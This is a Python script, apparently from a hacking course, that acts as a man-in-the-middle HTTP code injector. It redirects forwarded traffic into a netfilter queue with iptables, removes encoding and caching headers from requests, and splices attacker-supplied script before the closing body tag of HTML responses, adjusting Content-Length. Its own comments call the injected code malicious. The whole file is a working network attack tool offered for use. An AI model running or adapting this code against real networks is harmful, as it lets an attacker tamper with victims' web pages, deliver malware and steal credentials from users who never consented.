#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse
import re

# first become the man in the middle
# get the command line arguments
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-c","--code",dest="codeFile",help="File that contains the code to be injected into webpages")
    (options, arguments) = parser.parse_args()
    if not options.codeFile:
        parser.error("[-] Please enter a file extension to search for, use --help for more info")
    return options

# inject the malicious code
def set_load(packet, load):
    print("[+] Replacing load...")
    print(load)
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# how to process a packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # if it has a raw layer (content layer)
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        # if it is going to port 80 it is an http 
        if scapy_packet[scapy.TCP].dport ==80:
            print("[+] HTTP Request")
            # remove some problematic headers
            load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
            load = re.sub("If-Modified-Since:.*?\\r\\n", "",load)
        # this is a response
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            # so we will inject our load into the body of the page
            load = scapy_packet[scapy.Raw].load.replace("</body>", codeInjection)
            # we need to account for the change in content length
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length)+ len(codeInjection)
                load = load.replace(content_length, str(new_content_length))
        # modify the original packet to contain our payload
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

# get our commmad line args and open the file containing the mailcious code
options = get_arguments()
codefile = open(options.codeFile,"r")

if codefile.mode == "r":
    code = codefile.read()
print(code)
codeInjection = code.strip() + "</body>"

# set up iptables for this attack
# catch a CTRL+C from the user and exit gracefully
try:
    print("[+] Creating IP tables")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
    
    # local testing
    #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
    #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
    # local testing
    
    #  this is where the main loop of process_packet is called for each packet in the netfilterqueue
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Detected CTRL+C ")
    print("[+] Flushing IP tables")
    subprocess.call("iptables --flush",shell=True)
    print("[+] Quitting")

